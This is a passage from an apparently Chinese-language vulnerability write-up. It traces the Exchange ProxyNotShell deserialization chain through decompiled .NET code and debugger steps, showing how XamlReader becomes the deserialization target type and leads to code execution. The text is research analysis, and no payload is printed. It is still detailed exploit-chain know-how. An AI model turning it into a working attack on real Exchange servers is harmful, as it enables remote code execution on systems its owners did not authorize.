style="color:#f92672">&lt;/Name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Members></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;MemberSet></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Name></span>PSStandardMembers<span style="color:#f92672">&lt;/Name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Members></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;PropertySet></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Name></span>DefaultDisplayPropertySet<span style="color:#f92672">&lt;/Name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;ReferencedProperties></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Name></span>Status<span style="color:#f92672">&lt;/Name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Name></span>Name<span style="color:#f92672">&lt;/Name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Name></span>DisplayName<span style="color:#f92672">&lt;/Name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/ReferencedProperties></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/PropertySet></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/Members></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/MemberSet></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;AliasProperty></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Name></span>Name<span style="color:#f92672">&lt;/Name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;ReferencedMemberName></span>ServiceName<span style="color:#f92672">&lt;/ReferencedMemberName></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/AliasProperty></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;AliasProperty></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Name></span>RequiredServices<span style="color:#f92672">&lt;/Name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;ReferencedMemberName></span>ServicesDependedOn<span style="color:#f92672">&lt;/ReferencedMemberName></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/AliasProperty></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;ScriptMethod></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Name></span>ToString<span style="color:#f92672">&lt;/Name></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Script></span></span></span><span style="display:flex;"><span> $this.ServiceName</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/Script></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/ScriptMethod></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/Members></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/Type></span></span></span></code></pre></div><p>在<code>GetPSStandardMember</code>函数会试图获取System.ServiceProcess.ServiceController类的<code>TargetTypeForDeserialization</code>（传入的硬编码参数）属性，但其在文件内没有定义默认的<code>TargetTypeForDeserialization</code>值，所以外层类的<code>members</code>内没有<code>TargetTypeForDeserialization</code>名字的值，Exchange将试图从子类的<code>members</code>属性中检索<code>TargetTypeForDeserialization</code>名字的值，前面说过在对内层对象反序列化时，通过<code>ReadProperties</code>将名为<code>TargetTypeForDeserialization</code>的<code>XamlReader</code>类型的Type对象添加到了<code>adaptedMembers</code>中，此时<code>Exchange</code>将会检索到该对象并返回。</p><p>获取到<code>targetTypeForDeserialization</code>之后，<code>ReadOneObject</code>调用<code>LanguagePrimitives.ConvertTo</code>将序列化数据转换为<code>targetTypeForDeserialization(XamlReader)</code>。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">internal</span><span style="color:#66d9ef">object</span> ReadOneObject(<span style="color:#66d9ef">out</span><span style="color:#66d9ef">string</span> streamName)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> obj =<span style="color:#66d9ef">this</span>.ReadOneDeserializedObject(<span style="color:#66d9ef">out</span> streamName,<span style="color:#66d9ef">out</span> flag);</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span> Type targetTypeForDeserialization = psobject.GetTargetTypeForDeserialization(<span style="color:#66d9ef">this</span>._typeTable);</span></span><span style="display:flex;"><span>....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> obj2 = LanguagePrimitives.ConvertTo(obj, targetTypeForDeserialization,<span style="color:#66d9ef">true</span>, CultureInfo.InvariantCulture,<span style="color:#66d9ef">this</span>._typeTable);</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>ConvertTo函数会进行如下调用链，通过反射获取到XamlReader类的Parse方法后，将其调用，成功执行代码。</p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/3.png"/></p><h3 id="调试">调试</h3><p>使用dnsPy附加到下面的进程</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>c:\windows\system32\inetsrv\w3wp.exe -ap</span></span><span style="display:flex;"><span><span style="color:#e6db74">"MSExchangePowerShellAppPool"</span> -v<span style="color:#e6db74">"v4.0"</span> -c</span></span><span style="display:flex;"><span><span style="color:#e6db74">"C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfigWithGCServerEnabledFalse.config"</span></span></span><span style="display:flex;"><span>-a \\.\pipe\iisipm319caf0c-5de0-<span style="color:#ae81ff">4833</span>-8a04-4b28f4a836ae</span></span><span style="display:flex;"><span>-h<span style="color:#e6db74">"C:\inetpub\temp\apppools\MSExchangePowerShellAppPool\MSExchangePowerShellAppPool.config"</span></span></span><span style="display:flex;"><span>-w<span style="color:#e6db74">""</span> -m<span style="color:#ae81ff">0</span></span></span></code></pre></div><p>在以下几个地方下断点</p><ul><li>System.Runtime.Serialization.Formatters.Binary<ul><li>ObjectReader.Deserialize</li></ul></li></ul><p>发送PoC，调试器在断点处断下，此时调用栈如下:</p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/4.png"/></p><p>此时为Exchange试图将Props标签内的序列化数据通过ConvertTo函数转化为System.Exception对象，System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize会通过serParser.Run()解析读入内存中的base64解码数据。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">internal</span><span style="color:#66d9ef">object</span> Deserialize(HeaderHandler handler, __BinaryParser serParser,<span style="color:#66d9ef">bool</span> fCheck,<span style="color:#66d9ef">bool</span> isCrossAppDomain, IMethodCallMessage methodCallMessage)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span> serParser.Run();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.bFullDeserialization)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.m_objectManager.DoFixups();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (!<span style="color:#66d9ef">this</span>.bMethodCall &amp;&amp; !<span style="color:#66d9ef">this</span>.bMethodReturn)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.TopObject ==<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> SerializationException(Environment.GetResourceString(<span style="color:#e6db74">"Serialization_TopObject"</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.HasSurrogate(<span style="color:#66d9ef">this</span>.TopObject.GetType()) &amp;&amp;<span style="color:#66d9ef">this</span>.topId !=<span style="color:#ae81ff">0L</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.TopObject =<span style="color:#66d9ef">this</span>.m_objectManager.GetObject(<span style="color:#66d9ef">this</span>.topId);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.TopObject<span style="color:#66d9ef">is</span> IObjectReference)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.TopObject = ((IObjectReference)<span style="color:#66d9ef">this</span>.TopObject).GetRealObject(<span style="color:#66d9ef">this</span>.m_context);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.bFullDeserialization)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.m_objectManager.RaiseDeserializationEvent();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (handler !=<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.handlerObject = handler(<span style="color:#66d9ef">this</span>.headers);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.bMethodCall)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span>[] callA =<span style="color:#66d9ef">this</span>.TopObject<span style="color:#66d9ef">as</span><span style="color:#66d9ef">object</span>[];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.TopObject =<span style="color:#66d9ef">this</span>.binaryMethodCall.ReadArray(callA,<span style="color:#66d9ef">this</span>.handlerObject);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.bMethodReturn)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span>[] returnA =<span style="color:#66d9ef">this</span>.TopObject<span style="color:#66d9ef">as</span><span style="color:#66d9ef">object</span>[];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.TopObject =<span style="color:#66d9ef">this</span>.binaryMethodReturn.ReadArray(returnA, methodCallMessage,<span style="color:#66d9ef">this</span>.handlerObject);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">this</span>.TopObject;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>serParser.Run()会将内存序列化数据试图转化为<em>System.UnitySerializationHolder</em> 对象，代码如下，通过循环读取各个标志位调用不同方法从内存中读取指定类型的数据。构造出<em>System.UnitySerializationHolder</em>对象并载入<em>System.UnitySerializationHolder.AssemblyName</em>对应的DLL。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">internal</span><span style="color:#66d9ef">void</span> Run()</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> flag =<span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.ReadBegin();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.ReadSerializationHeaderRecord();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (flag)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> BinaryHeaderEnum binaryHeaderEnum = BinaryHeaderEnum.Object;</span></span><span style="display:flex;"><span> BinaryTypeEnum binaryTypeEnum =<span style="color:#66d9ef">this</span>.expectedType;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (binaryTypeEnum != BinaryTypeEnum.Primitive)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (binaryTypeEnum - BinaryTypeEnum.String ><span style="color:#ae81ff">6</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> SerializationException(Environment.GetResourceString(<span style="color:#e6db74">"Serialization_TypeExpected"</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span> b =<span style="color:#66d9ef">this</span>.dataReader.ReadByte();</span></span><span style="display:flex;"><span> binaryHeaderEnum = (BinaryHeaderEnum)b;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span> (binaryHeaderEnum)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> BinaryHeaderEnum.Object:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.ReadObject();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> BinaryHeaderEnum.ObjectWithMap:</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.ReadObjectWithMap(binaryHeaderEnum);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> BinaryHeaderEnum.ObjectWithMapTyped:</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.ReadObjectWithMapTyped(binaryHeaderEnum);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> BinaryHeaderEnum.ObjectString:</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.ReadObjectString(binaryHeaderEnum);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> BinaryHea......flag2)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ObjectProgress objectProgress = (ObjectProgress)<span style="color:#66d9ef">this</span>.stack.Peek();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (objectProgress ==<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.expectedType = BinaryTypeEnum.ObjectUrt;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.expectedTypeInformation =<span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> flag2 =<span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> flag2 = objectProgress.GetNext(<span style="color:#66d9ef">out</span> objectProgress.expectedType,<span style="color:#66d9ef">out</span> objectProgress.expectedTypeInformation);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.expectedType = objectProgress.expectedType;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.expectedTypeInformation = objectProgress.expectedTypeInformation;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (!flag2)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.prs.Init();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (objectProgress.memberValueEnum == InternalMemberValueE.Nested)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.prs.PRparseTypeEnum = InternalParseTypeE.MemberEnd;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.prs.PRmemberValueEnum = objectProgress.memberValueEnum;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.objectReader.Parse(<span style="color:#66d9ef">this</span>.prs);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.prs.PRparseTypeEnum = InternalParseTypeE.ObjectEnd;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.prs.PRmemberValueEnum = objectProgress.memberValueEnum;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.objectReader.Parse(<span style="color:#66d9ef">this</span>.prs);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.stack.Pop();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.PutOp(objectProgress);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/5.png"/></p><p>将XamlReader读入内存</p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/6.png"/></p><p>在System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize中将通过</p><p><code>this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context);</code> 将<em>System.UnitySerializationHolder</em>转化为Type类型的XamlReader对象，并通过反射获取了XamlReader类的各个属性。</p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/7.png"/></p><p>在最后将this.TopObject作为返回值返回，在经过一系列函数调用返回后，可以在调试器看到ConvertTo函数返回了Object类型对象obj2，可以看到其为类型为Type类型的XamlReader对象，之后ReadOneObject返回该对象。</p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/8.png"/></p><p>注：Type类型是Exchange内定义的抽象类，如下所示：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> System</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#75715e">// Token: 0x02000148 RID: 328</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"> [ClassInterface(ClassInterfaceType.None)]</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"> [ComDefaultInterface(typeof(_Type))]</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"> [ComVisible(true)]</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"> [__DynamicallyInvokable]</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"> [Serializable]</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">abstract</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">Type</span> : MemberInfo, _Type, IReflect</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#75715e">// Token: 0x17000217 RID: 535</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// (get) Token: 0x060013E6 RID: 5094 RVA: 0x0003BE2A File Offset: 0x0003A02A</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">override</span> MemberTypes MemberType</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">get</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> MemberTypes.TypeInfo;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>(应该可以理解obj2为实现了Type这个抽象类的XamlReader对象，而XamlReader继承了Object这个父类，所以可以使用Object类型对象接受)</p><p>在调用栈内，ReadOneObject由ReadProperties调用，回到ReadProperties逻辑中，Exchange会将ReadOneObject返回的的Type类型的XamlReader对象添加到dso.adaptedMembers中，而后这个dso将会返回到调用栈内的ReadOneObject函数。</p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/9.png"/></p><p>继续调试，此时嵌套对象的内层对象已反序列化，开始反序列化外层对象，回到程序中，从下图可以看到，将会调用psobject.GetTargetTypeForDeserialization获取目标反序列化类型，此时psobject内的adaptedMembers内有名为TargetTypeForDeserialization的对象，其类型为Type的XamlReader对象</p><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/10.png"/></p><p>进入到psobject.GetTargetTypeForDeserialization内，调用this.GetPSStandardMember试图获取PSMemberInfo 对象，而后将其强转为Type对象返回，若失败则返回null</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">internal</span> Type GetTargetTypeForDeserialization(TypeTable backupTypeTable)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> PSMemberInfo psstandardMember =<span style="color:#66d9ef">this</span>.GetPSStandardMember(backupTypeTable,<span style="color:#e6db74">"TargetTypeForDeserialization"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (psstandardMember !=<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> psstandardMember.Value<span style="color:#66d9ef">as</span> Type;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>在GetPSStandardMember函数内，调用PSObject.TypeTableGetMemberDelegate并传入当前对象、允许的类型列表和硬编码PSStandardMembers以初始化PSMemberSet 对象。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">internal</span> PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable,<span style="color:#66d9ef">string</span> memberName)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> PSMemberInfo psmemberInfo =<span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> TypeTable typeTable = (backupTypeTable !=<span style="color:#66d9ef">null</span>) ? backupTypeTable :<span style="color:#66d9ef">this</span>.GetTypeTable();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (typeTable !=<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate&lt;PSMemberSet>(<span style="color:#66d9ef">this</span>, typeTable,<span style="color:#e6db74">"PSStandardMembers"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (psmemberSet !=<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> psmemberSet.ReplicateInstance(<span style="color:#66d9ef">this</span>);</span></span><span style="display:flex;"><span> psmemberInfo =<span style="color:#66d9ef">new</span> PSMemberInfoIntegratingCollection&lt;PSMemberInfo>(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName];</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (psmemberInfo ==<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> psmemberInfo = (<span style="color:#66d9ef">this</span>.InstanceMembers[<span style="color:#e6db74">"PSStandardMembers"</span>]<span style="color:#66d9ef">as</span> PSMemberSet);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> psmemberInfo;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/11.png"/></p><p>而后调用PSMemberInfoIntegratingCollection构造函数，其中PSMemberInfoIntegratingCollection类继承了PSMemberInfo类。传入构造函数的collections变量来源于<code>PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable)</code> 函数的返回值，构造函数将collections赋给当前对象的collections属性。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">internal</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">PSMemberInfoIntegratingCollection</span>&lt;T> : PSMemberInfoCollection&lt;T>, IEnumerable&lt;T>, IEnumerable<span style="color:#66d9ef">where</span> T : PSMemberInfo</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#75715e">// Token: 0x06002AC3 RID: 10947 RVA: 0x000C35F4 File Offset: 0x000C17F4</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">void</span> GenerateAllReservedMembers()</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (!<span style="color:#66d9ef">this</span>.mshOwner.hasGeneratedReservedMembers)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.mshOwner.hasGeneratedReservedMembers =<span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span> ReservedNameMembers.GeneratePSExtendedMemberSet(<span style="color:#66d9ef">this</span>.mshOwner);</span></span><span style="display:flex;"><span> ReservedNameMembers.GeneratePSBaseMemberSet(<span style="color:#66d9ef">this</span>.mshOwner);</span></span><span style="display:flex;"><span> ReservedNameMembers.GeneratePSObjectMemberSet(<span style="color:#66d9ef">this</span>.mshOwner);</span></span><span style="display:flex;"><span> ReservedNameMembers.GeneratePSAdaptedMemberSet(<span style="color:#66d9ef">this</span>.mshOwner);</span></span><span style="display:flex;"><span> ReservedNameMembers.GeneratePSTypeNames(<span style="color:#66d9ef">this</span>.mshOwner);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">internal</span> PSMemberInfoIntegratingCollection(<span style="color:#66d9ef">object</span> owner, Collection&lt;CollectionEntry&lt;T>> collections)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (owner ==<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> PSTraceSource.NewArgumentNullException(<span style="color:#e6db74">"owner"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.mshOwner = (owner<span style="color:#66d9ef">as</span> PSObject);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.memberSetOwner = (owner<span style="color:#66d9ef">as</span> PSMemberSet);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.mshOwner ==<span style="color:#66d9ef">null</span> &amp;&amp;<span style="color:#66d9ef">this</span>.memberSetOwner ==<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> PSTraceSource.NewArgumentException(<span style="color:#e6db74">"owner"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (collections ==<span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> PSTraceSource.NewArgumentNullException(<span style="color:#e6db74">"collections"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.collections = collections;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><img alt="Untitled" src="/images/vulnerability/proxy-not-shell.zh-cn.assets/12.png"/></p><p>GetMemberCollection代码如下，其会将对象的<em>adaptedMembers</em>属性添加到列表中，而在内层对象反序列化时已经将名为TargetTypeForDeserialization的XamlReader类型的Type对象加入到<em>adaptedMembers</em>属性中。所以返回的列表内也会包含该对象。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">internal</span><span style="color:#66d9ef">static</span> Collection&lt;CollectionEntry&lt;PSMemberInfo>> GetMemberCollection(PSMemberViewTypes viewType, TypeTable backupTypeTable)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> Collection&lt;CollectionEntry&lt;PSMemberInfo>> collection =<span style="color:#66d9ef">new</span> Collection&lt;CollectionEntry&lt;PSMemberInfo>>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((viewType &amp; 